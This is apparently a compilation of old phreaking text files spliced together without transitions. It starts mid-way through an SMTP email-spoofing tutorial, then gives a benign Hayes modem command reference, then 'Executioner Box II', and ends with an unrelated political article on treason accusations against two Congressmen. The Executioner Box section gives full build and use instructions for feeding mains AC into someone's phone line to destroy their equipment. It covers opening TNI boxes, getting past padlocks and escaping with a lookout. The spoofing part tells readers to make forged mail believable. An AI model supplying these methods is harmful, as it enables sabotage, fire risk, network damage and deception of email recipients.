Now wasnít that nice?  This mail server is pleased to meet you.  Ok, now letís get down 
to it.  You need to tell the server who this mail is coming from.  Essentially, who YOU 
are, or who youíd like to be.  Type this at the prompt: "MAIL FROM: 
yourdesiredname@anysite.com"

---
MAIL FROM: bios@microsoft.com
250 2.1.0 bios@microsoft.com... Sender ok
---

Now as far as it knows, that sender is ok.  Itís cool with that e-mail address.  Now we 
want to tell it who will be receiving this mail.  Type: "RCPT TO: 
billgates@microsoft.com"

---
RCPT TO: billgates@microsoft.com
250 Recipient ok
---

All right, now we have the "to" and "from" info all entered and ready to go.  Now letís 
write this E-mail.  Itís done by typing DATA, then type in your message.  When you are 
finished typing the e-mail, hit enter.

---
DATA
Dear Bill,
You suck. And your software sucks. And thatís sad.

250 Message accepted for delivery...
---

Now to disconnect from the server, just enter the command QUIT.  Thatís about it!  Your 
mail is on its way!  Most typical users will not be able to tell the difference unless they 
understand how to read the headers of their emails.  Make them somewhat believable, 
and you can have lots of fun!  Like I said earlier, this is an older trick.  Some of you may 
not know about it.  Some of you may.  Either way, have fun with it.  Enjoy yourself.  And 
never stop exploring.

The Hayes Modem Command Set
---------------------------
by: Magickal1


Here is a description of the Hayes Command Set. Most modems follow this 
command set to large extent. If you lost your modem manual or never had 
one in the first place, this reference might come in handy. I for 
instance finally found out how to turn my modems speaker off: ATM0 -- 
Finally: Silence!


The modem initialization string consists of a series of commands. It 
prepares the modem for communications, setting such features as dialing 
mode, waits, detection of the busy signal and many other settings. Newer 
modem communications programs reset the initializations string for you 
according to which menu options you select, which features you enable, 
etc..

For many years Hayes modems have been the standard. As the field of 
modem manufactures has grown, most have adhered at least loosely to the 
Hayes standard. The following is a partial list of the Hayes command set. 
(called the "AT" commands). The Hayes Command Set can be divided into 
four groups:

Basic Command Set

A capital character followed by a digit. For example, M1.

Extended Command Set

An "&" (ampersand) and a capital character followed by a digit. This is 
an extension of the basic command set. For example, &M1. Note that M1 
is different from &M1.

Proprietary Command Set

Usually started by either a backslash ("\"), or a percent sign ("%"), 
these commands vary widely among modem manufacturers. For that reason, 
only a few of these commands are listed below.

Register Commands

Sr=n where r is the number of the register to be changed, and n is the 
new value that is assigned.


A "register" is computerese for a specific physical location in memory. 
Modems have small amounts of memory onboard. This fourth set of 
commands is used to enter values in a particular register (memory location). 
The register will be storing a particular "variable" (alpha-numeric 
information) which is utilized by the modem and communication software. For 
example, S7=60 instructs your computer to "Set register #7 to the value 
60".


Note


Although most commands are defined by a letter-number combination (L0, 
L1 etc.), the user of a zero is optional. In this example, L0 is the 
same as a plain L. Keep this in mind when reading the table below!


Here are some of the most important characters that may appear in the 
modem initialization string. These characers normally should not be 
changed.

AT

Tells the modem that modem commands follow. This must begin each line 
of commands.

Z

Resets the modem to it's default state

, (a comma)

makes your software pause for a second. You can use more than one , in 
a row. For example, ,,,, tells the software to pause four seconds. (The 
duration of the pause is governed by the setting of register S8.

^M

Sends the terminating Carriage Return character to the modem. This is a 
control code that most communication software translates as "Carriage 
Return"


The Basic Hayes Command Set

In alphabetical order:


Table B.1. Basic Hayes Command Set


Command		Description		Comments


A0 or A		Answer incoming call	
 
A/		Repeat last command	Don't preface with AT. Enter usually aborts.

B0 or B		Call negotiation	V32 Mode/CCITT Answer Seq.

B1		Call negotiation	Bell 212A Answer Seq.

B2		Call negotiation	Verbose/Quiet On Answer

D		Dial			Dial the following number and then handshake in orginate 
mode.

					P	Pulse Dial

					T	Touch Tone Dial

					W	Wait for the second dial tone

					,	Pause for the time specified in register S8 (usually 2 
seconds

					;	Remain in command mode after dialing.

					!	Flash switch-hook (Hang up for a half second, as in
transferring a call.

					L	Dial last number

E0 or E		No Echo			Will not echo commands to the computer

E1		Echo			Will echo commands to the computer (so one can see what one 
types)

H0		Hook Status		On hook - Hang up

H1		Hook status		Off hook - phone picked up

I0 or I		Inquiry, Information, or Interrogation
						This command is very model specific. I0 usually returns a
number or code, while higher numbers often provide much more 						
useful information.

L0 or L		Speaker Loudness. Modems with volume control knobs will not 
have these options.
Off or low volume

L1		Low Volume

L2		Medium Volume

L3		Loud or High Volume

M0 or M		Speaker off			M3is also common, but different on many brands


M1						Speaker on until remote carrier detected (i.e. until the
other modem is heard)


M2						Speaker is always on (data sounds are heard after CONNECT)


N0 or N		Handshake Speed			Handshake only at speed in S37


N1						Handshake at highest speed larger than S37

O0 or O		Return Online			See also X1 as dial tone detection may be 
active.

O1						Return Online after an equalizer retrain sequence


Q0 or Q1	Quiet Mode			Off - Displays result codes, user sees command 
responses 						(e.g.OK)

Q1		Quiet Mode			On - Result codes are suppressed, user does not see
responses.

Sn?						Query the contents of S-register n

Sn=r		Store				Store the value of r in S-register n

V0 or V		Verbose				Numeric result codes

V1						English result codes (e.g.CONNECT, BUSY, NO CARRIERetc.)

X0 or X		Smartmodem			Hayes Smartmodem 300 compatible result codes

X1						Usually adds connection speed to basic result codes 
(e.g.CONNECT 1200

X2						Usually adds dial tone detection (preventing blind dial, and 
sometimes preventing AT0)

X3						Usually adds busy signal detection

X4						Usually adds both busy signal and dial tone detection

Z0 or Z		Reset				Reset modem to stored configuration. Use Z0, Z1etc. 
for 						multiple profiles. This is the same as &F for factory
						default on modems without NVRAM (non voltaile memory)

The Extended Hayes Command Set


Ampersand Commands


Table B.2. The Extended Hayes Command Set

Command			Description		Comments

&B0 or &B		Retrain Parameters	Disable auto retrain function

&B1			Retrain Parameters	Enable auto retrain function

&B2			Retrain Parameters	Enable auto retrain, but disconnect if no line 
improvement 						over the period dictated by S7

&C0 or &C1		Carrier detect		Signal always on

&C1			Carrier detect		Indicates remote carrier (usual preferred 
default)

&D0 or &D		Data Terminal Ready(DTR Signal ignored (This is modem 
specific, you must see 						your manual for information on this one!)

&D1			Data Terminal Ready(DTR	If DTR goes from On to Off the modem goes 
into command mode 						(Some modems only)
&D2			Data Terminal Ready(DTR	Some modems hang up on DTR On to Off 
transition (This is the 						usual preferred default)
&D3			Data Terminal Ready(DTR	Hang up, reset the modem, and return to 
command mode upon DTR

&F0 or &F		Factory defaults	Generic Hayes-compatible defaults. 
						This is usually a good thing to use in your init string,
          					since the &F1-&F3 settings can vary among modems, and they 
						may actually be the cause of connection problems. 
						(Since you never know exactly what Brand X's &F2 really changes.

						On the other hand, it pays to try out the other options
						below; many people's problems can be solved by replacing a 
						complicted init string with a simple &F2 or the like.  However, if 
						building an init string, it's best to start with a simple &F, and not 
						use the "customized" form of defaults.

&F1			Factory Defaults	Factory Defaults tailored to an IBM PC 
compatible user

&F2			Factory Defaults	Factory defaults for a Mac w/software 
handshaking

&F3			Factory Defaults	Factory defaults for a Mac w/hardware 
handshaking

A direct connection is a simple straight-through connection without any 
error connection or data compression. In this case, the 
computer-to-modem and modem-to-modem speeds must be identical.

A normal connection uses flow control (either software or hardware) to 
buffer the data being sent or received, so that the modem can transmit 
data at a different rate than the computer is actually sending or 
receiving it. For example, a computer may send actual data at 57kbps, but 
using compression, the modem only actually sends 28.8kbps. This is the 
mode use by most modems.

A reliable connection is a type of normal connection; if, for some 
reason, data compression or error correction cannot be established or 
maintained, the connection will hang up. (In essence, such a modem ensures 
that all connections are reliable, for it will hang up if the connection 
isn't.)

Likewise, an auto-reliable connection is virtually the same, except 
that the modem will try to renegotiate the connection in order to 
establish a reliable connection. Again, this is the mode that most modems use.

modem not to hang up for seven seconds should it not hear the answering 
modem, and return the number of times the phone last rang.)

Executioner Box II - By Captain B
---------------------------------

Before anything else, let me make the purpose of both this, and the 
original version of the Executioner Box crystal clear, (Since there seems 
to have been some confusion about it). The Executioner Box I and II was 
NOT designed or intended for the purposes of being connected to phones, 
phone lines, and all other CPE (Customer Premise Equipment) and left 
turned on/unattended. Both versions of the Executioner Box are meant for 
the purposes of frying phones, modems, CID (Caller ID) units, fax 
machines, answering machines, and all other telecom devices connected to any 
given phone line, NOT people! To acheive this, you only need to keep 
the Executioner Box I or II plugged in/turned on for a few moments. NOT 3 
mins, or anything like that! Please be fully aware of the dangerous 
nature of the Executioner Box I and II. ESPECIALLY when the Executioner 
Box I or II is misused! Speaking of which, I will NOT be held responsible 
for the blatant misuse of the Executioner Box I or II. Do not operate 
while under the influence of alcohol, sleep aids and other narcotics, or 
wanton stupidity. Hopefully, this lengthy (and perhaps all-inclusive) 
disclaimer has routed out all potential ignorance. It should also be 
noted that unless you isolate the subscriber line by disconnecting the 
person's inside wiring from the telephone network at the TNI (Telephone 
Network Interface) box, the over-voltage/current surge can do damage to 
telecom equipment back at the CO (Central Office). To disconnect the 
line from the phone network with newer model TNI boxes, plug a working 
phone into the test jack on the customer side (left side) of the TNI box. 
With older model TNI boxes, remove the plug from the short, black 
colored line cord from the test jack. To locate where the TNI box is, look 
for a grayish colored  rectangular shaped box on an outside wall of a 
building. And yes, it will say "Telephone Network Interface", or maybe 
some slight variation of that on it. Some TNI boxes even have the 
telephone company's name on it. But, some TNI boxes are placed too high up on 
a wall of some buildings to be able to be reached easily. Also, you're 
going to need either a standard Phillips or flat head screwdriver to 
open the customer side of a TNI box, or you'll need a 3/8" hex nutdriver 
to open the entire TNI box through the telco access side. If there's a 
padlock on the TNI box, you'll have to open the TNI box from the telco 
access side, since that sort of "bypasses" the padlock. However, some 
buildings may not have a TNI box at all in the first place. The basic, 
overall principal behind Executioner Box II remains EXACTLY the same as 
for the first version of the Executioner Box; And that's to send more 
voltage/current than the phones and all other phone equipment is able to 
safely handle, thereby "frying" all phones and phone equipment 
connected to a given phone line. For comparison sake, the highest normal 
voltage on a phone line is during when a phone is ringing. (85-90 Volts AC, 
depending on how far you live from your central office). Also, the  
ringing AC voltage for phone lines is about 20Hz (cycles) per second, where 
as a standard electrical outlet in a house has between 110-120VAC 
(Volts AC) at around 60Hz per second. The more phones and phone equipment 
there is connected to a given phone line, the more ringing power 
(voltage/current) is needed to make all the phones ring. Because, of course, 
all phones/phone equipment draw power from the phone line. Anyway, here 
are the differences between the 1st and 2nd versions of the Executioner 
Box...

-On/off cord switch
-More compact design (..of surface mount phone jack used in this)

Plus, I'll give more alternative ways to build this box. Let me point 
out however that the more compact design of the phone jack used for 
Executioner Box II only allows for the ability to fry phones and phone 
equipment on up to 2 lines at once, as compared to up to 3 lines at once 
for the original Executioner Box. To use Executioner Box II on up to 3 
lines at once, substitute the Radio Shack RJ25 (3-line) surface mount 
jack used in Executioner Box I instead of using the 2 line surface mount 
jack mentioned here. Here's what you'll need to make this box...

-Wire cutters (The Radio Shack nippy cutters are great, but not 
madatory)
-Wire stripper
-AC lamp cord (It has a twistable on/off switch built into the cord
-Small, surface mount phone jack (This can be bought at Home Depot 
under the RCA brand name, or from K-mart under the Southwestern Bell brand 
name for about $3 +tax)

The wire cutters/stripper can be bought at Radio Shack. A variety of 
different types are availible, and no one particular type is mandatory to 
buy for this project. Any type should do. As for the AC lamp cord, you 
could simply cut one off an old lamp that either doesn't work, or you 
don't plan on using anymore. Just as long as the AC cord is good, and 
the on/off switch on the cord works, It's alright to use for building 
this box. If you don't have an old lamp with a on/off switch on the cord, 
you might find an old lamp for cheap at a garage sale, yard sale, flea 
market, 2nd hand store, or perhaps even some junk shop. But, if you 
want to buy an AC lamp cord you can be sure is in good working order, you 
can buy one for $3.98 +tax at Home Depot stores. You'll have to cut the 
light bulb socket off the end of the AC cord before it can be used for 
making this box. Also, it should be mentioned that actually ANY working 
AC power cord can be used for building Executioner Box II. But, with a 
lamp cord, you have the ability to turn the power on/off more quickly 
and easily. (Which, of course, can be pretty important with Executioner 
Box I and II). If, however, you don't mind using an AC cord without a 
built-in on/off switch, you may want to buy an electric shaver cord. 
Since electric shaver cords are coiled, it prevents cord tangles, which is 
helpful if you need to disconnect everything and pack up in a hurry. If 
you can solder, and own a soldering iron, and solder, it might be 
possible to solder up (add) a small SPST (Single Pole, Single Throw) on/off 
switch. Having some rosin flux solder paste would help, too. (It makes 
soldered joints stronger). To do this, you would also need to make a 
hole big enough somewhere in the phone jack's chasis to put in the on/off 
switch. And, with both the AC cord's wire leads, and the 4 phone wires 
inside the fairly small confines of the phone jack, it makes adding 
your own on/off switch all the more difficult. Of course, if you'd rather, 
you can actually use any size 1 piece, self contained, surface mount 
phone jack for making this box. ("Self contained" means the screw 
terminals (42A block) and phone jack are built together in 1 piece, the back 
half, and the outer cover attaches over it). If you still want to try 
adding your own switch into the phone jack chasis, and building 
Executioner Box II in that way, just make sure to buy an SPST switch that 
supports enough amperage (current). Look on the switch's package to find out 
the voltage/current ratings. Smaller switches tend to support less 
current. Running more voltage or current into a switch above the 
voltage/current ratings is risky. The same holds true for all electronic 
components. It's possible to use foreign standard (220-240 Volts AC) with 
Executioner Box II if you buy the 40 watt step-up voltage converter, (Part# 
273-1411 for about $33 +tax) and the foreign adapter travel kit, (Part# 
273-1407 for about $12 +tax) both from Radio Shack. But remember, the 
more voltage/current is used when running this box, the more dangerous 
it gets. Besides, I happen to know fact from testing the Executioner Box 
I that 110-120 Volts AC is enough to do job of frying phones and phone 
equipment. In other words, using 220-240 Volts AC is not a must.

-Construction-
First, remove the outer cover from the surface mount phone jack. Then, 
take the AC cord and cut about 5-6 feet of it (or desired length) using 
wire cutters, or a wire cutter/stripper. If you use an AC extension 
cord for making this box, you obviously want the plug at one end, then 
5-6Ft. of cord afterward. (So, cut the extension outlets off the other 
end). Now, using the wire cutters, carefully cut a small notch up the 
center between the 2 wires on the AC cord. (The Radio Shack nippy cutters 
with their small size are good for this job). After cutting the small 
notch, grab each half of the AC cord, and very slowly and carefully pull 
apart the 2 wires on the cord a bit more. Give yourself maybe about 4-5 
inches length of each of the 2 wire leads. Now that you have each 
insulated wire seperated at the end of the cord, you'll need to strip the 
insulation off each insulated wire lead at the ends. Carefully strip off 
about an inch or so of insulation on each wire end. If you have solder 
and soldering iron, you can also "tin the tips" of the AC cord wire 
leads after they've been stripped, if you so desire. Otherwise, you may 
want to simply twist the copper strands of the wire together with your 
fingers, to make the wire leads easier to work with. Now, take the 
screwdriver and loosen, but don't remove, the screws holding the yellow and 
black wires. Also loosen, but don't remove, the screws holding the red 
and green wires. Attach the yellow wire to the same screw holding the 
red wire. After that, attach the black wire to the screw holding the 
green wire in the same manner. If you want, you can now remove the other 2 
screws now that no wires are no longer attached to those screws. Note: 
if you have 6 wires (Red, green, yellow, black, blue, and white) you're 
using a 3-line jack. For a 3 line jack, take the screwdriver and 
loosen, but don't remove, the screws holding the blue, white, yellow, and 
black wires. Also loosen, but don't remove, the screws holding the red and 
green wires. Attach the blue and yellow wires under the same screw 
holding the red wire. You can attach it underneath the 2 washers on the 
screw just like red wire is attached, or attach it any other way. After 
you're done with that, attach the white and black wires to the screw 
holding the green wire in the same manner. If you want, you can now remove 
the other 4 screws now that no wires are no longer attached to those 
screws. Now, attach one of the stripped wire ends from the AC cord to one 
of the screws holding the phone wires, making sure to wrap it clockwise 
firmly around the screw under the screw's head. Then, tighten that 
screw down using the screwdriver. Repeat the process with the other 
stripped wire end from the AC cord, attaching it to the other screw, and 
tightening the screw down. Run the AC cord through the opening in the side 
of the jack, snap the phone jack's outer cover back on, and you're done. 
By the way, there's no need to worry about correct polarity 
(Ring/Negative, Tip/Positive) when hooking up the wire leads of the AC cord to the 
screws since the voltage you'll be using is AC, (Alternating Current) 
which repeatedly and constantly changes direction of current flow. Only 
DC (Direct Current) has only 1 proper current flow direction. 
Executioner Box I or II can also be hooked up to any corded phone if you modify 
a handset cord by cutting off the handset cord plug on one end of the 
handset cord, and crimping on a line cord plug at that same end. Then, 
simply disconnect the existing handset cord from the handset cord jack 
in the base of the phone you'll be connecting up Executioner Box I or II 
to, connect the line cord plug end of the modified handset cord into 
the surface mount jack on Executioner Box I or II, and connect the other 
handset cord plug end into the handset cord jack on the phone's base. 
Details of how to modify a handset cord in this way can be found in my 
"Conversion box" file. And, since the basic concept behind that was 
essentially taken from my Bungee box, that could also be used for 
reference, too. But, the thing is, if you connect the Executioner Box I or II 
directly to a phone in this way, you'll also ruin that phone. Even so, I 
just wanted you to know it was possible to connect up Executioner Box I 
or II in this way. Anyway, on to how to use this.=20

-Usage-
If you're going to use this at someone's TNI, (Network Interface)  
you'll need a portable source of AC voltage, like a portable generator. 
Some portable generators are quite noisy, because they use moving parts 
like a motor to serve as the alternator for generating the necessary AC 
voltage/current. So, you'll want to get a portable generator that uses a 
battery for power, and runs quiet. Last I seen, Radio Shack sold a 
portable generator called PortaWattz that operated on a 12v battery, could 
handle up to 300 Watts, and had an AC output of 115VAC. Which is 
perfect. You'll want a generator that can put out between 110-120VAC. But, 
this Radio Shack generator is only availible through Radio Shack 
Unlimited (Comapny direct sales) last time I checked. So, you won't find it in 
Radio Shack stores. And, at $149.99 +tax (as listed in their 2001 
catalog) It's quite expensive. But otherwise, without a portable generator, 
you'd only be able to use the Executioner box wherever you have access 
to an AC electrical outlet. At any rate, whether using it at a TNI, or 
at a standard phone jack, the basic principal remains the same. Connect 
up a modular line cord to the Executioner box that's connected to a 
working phone jack. Plug the AC power cord into a working AC outlet (turn 
it on if you're using a lamp cord with an on/off switch), and within a 
moment or so, you'll fry the internal electronic components of all 
phones, and phone equipment attached to the phone line in the house. 
Needless to say, this is obviously a box you only want to use on your 
enemies. Also, I definitely suggest you either turn off or unplug Executioner 
box II before very long, as leaving it plugged in/turned on for long 
periods of time could run the risk of starting a fire. Phones and all 
phone equipment simply aren't meant to handle this kind of voltage and 
current. Also, phone voltage is typically DC (Except when ringing). 
Speaking of that, when you connect up Executioner box II, it will make all 
phones on the line ring. Even if they're off the hook. Anyway, let's get 
back to the topic of using the Executioner Box II at a TNI. Simply open 
the TNI on the customer access side. (You could open the whole TNI 
through the Telco Access side, but It's not necessary). Remove the plug of 
the short line cord from the test jack. It would be the one with wires 
running into the house attached to the 2 screw terminals alongside the 
test jack. (Unused test jacks don't have connection to the phone wiring 
from the house). After unplugging the cord from the test jack, connect 
it to  Executioner box II. With newer model TNI boxes (which have no 
short line cord plugged into the test jack), you've got to plug in a 
working phone into the test jack, then connect up the Executioner Box II 
via a line cord modified alligator clips. And, attach the alligator clips 
to the ends of the wire leads of the phone line running into the house. 
If need be, you can unscrew those wire leads from the 2 screw terminals 
they're connected to inside the TNI box. Now, turn on the power for the 
generator, and turn the AC cord's on/off switch on (if you built this 
box with that kind of cord) for a brief moment or so, then turn it off. 
Quickly unplug the line cord from Executioner box II, and plug it back 
into the test jack where it was. Close up the TNI, pack up all your 
stuff, and get the hell out of there, FAST! One final note: It's not a 
good idea to connect up the Executioner box and use it inside your house, 
or anyone else's, since the voltage surge could travel all the way back 
to your local CO (Central Office) and cause problems for other area 
phone lines. Remember, this box is dangerous with a capital "D"! So, 
exercising caution when using it is definitely the best way to go. And, you 
may want to have some one come along with you to serve as "look out". 
If you want to test the effects of this box on only 1 phone that you 
don't need anymore, just connect a phone line cord between Executioner box 
II and the phone. Plug in the AC cord into an AC outlet (turn the AC 
cord switch on, if you've built this using a lamp cord) for a brief 
moment or so, then unplug the AC cord (or turn the cord switch off). 
Congrats! Another phone rendered totally dead and useless. Again, be careful 
and intelligent about how, when and where you use this box, and have 
phun.

        Some Call It Treason
        ====================
        By: Matthew Rothschild


        New Jersey State Senator James Cafiero upped the political rhetoric 
        to a whole new level when, on October 17, he introduced a resolution 
        urging Attorney General John Ashcroft to indict two Congresspeople 
        who went to Iraq on charges of treason.

        The traitors, according to Cafiero, are Representative Jim McDermott, 
        Democrat of Washington, and Representative David Bonior, Democrat of 
        Michigan.

        Cafiero, the Republican whip in the Jersey state house, stated in his 
        resolution: "The public comments critical of the policies and President 
        of the United States made by United States Representatives Jim McDermott 
        and David Bonior during a recent trip to Baghdad constitute an act of 
        treason against the United States. . . .

        [Their comments] gave aid and comfort to an enemy of the United States."

        McDermott and Bonior were in Iraq at the end of September and in early 
        October. They were seeking a peaceful resolution to the conflict and 
        were pleading for the United States to agree to let the U.N. inspectors 
        return to work right away.

        On ABC's "This Week" program of September 29, McDermott said that Bush 
        was "trying to provoke a war." He also said that the Untied States should 
        "take the Iraqis at their face value," and--most controversially--"I think 
        the President would mislead the American people."

        McDermott and Bonior immediately came under fire. George Will called them 
        Saddam's "American collaborators" and "useful idiots." Senator John McCain 
        slammed them, and Representative Sam Johnson, Republican of Texas, said, 
        "You cannot cavort around with the enemy and be a good American."

        Upon returning to the United States, McDermott tried to do some damage 
        control. "I perhaps overstated my case," he said.

        But Cafiero was not content to leave the controversy alone. "These two 
        Congressmen should have known better than to use their position as elected 
        officials to fan the flames of an already volatile situation by questioning 
        the wisdom of U.S. foreign policy while standing on Iraqi soil."

        Spokespersons for both Representatives declined to comment on Cafiero's 
        legislation.

        But early on in the controversy, McDermott did tell Paula Zahn of CNN, 
        "Dissent is an American right, and without it, it's not a democracy."
